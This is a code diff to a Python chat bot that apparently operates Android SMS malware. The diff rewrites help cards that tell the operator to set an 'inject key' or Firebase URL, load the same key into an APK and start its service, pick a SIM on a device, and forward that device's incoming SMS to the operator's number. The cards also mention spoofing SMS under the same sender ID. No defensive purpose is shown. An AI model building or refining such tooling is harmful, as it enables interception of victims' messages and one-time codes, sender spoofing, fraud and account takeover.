@@ -329,7 +329,7 @@ def format_key_error_card() -> str:
         "❌ <b>ERROR</b>\n\n"
         "<pre>"
         "Usage: /key KEY-XXXX-XXXX-XXXX\n"
-        "Example: /key KEY-BF0U-2LBM-5W6W\n\n"
+        "Example: /key KEY-BQUB-J7LC-EWI1-RW94\n\n"
         "Or Firebase URL:\n"
         "/key https://your-app.firebaseio.com\n\n"
         "This is your inject target (like /mynum for spoof SMS)."
@@ -343,8 +343,12 @@ def format_key_set_card(inject_key: str) -> str:
         "<pre>"
         "Inject Key Set!\n\n"
         f"🔑 Key: {inject_key}\n\n"
-        "Next: /fy &lt;device_id&gt; → pick SIM → /addchannel → /startmonitor\n"
-        "Incoming SMS will inject with SAME sender ID."
+        "APK mein bhi SAME key daalo + START SERVICE\n\n"
+        "Next:\n"
+        "/fy &lt;device_id&gt; → SIM pick\n"
+        "/mynum &lt;number&gt; → incoming SMS yahan\n"
+        "/addchannel → /startmonitor\n\n"
+        "Polling start → device SMS /mynum par forward"
         "</pre>"
     )
 
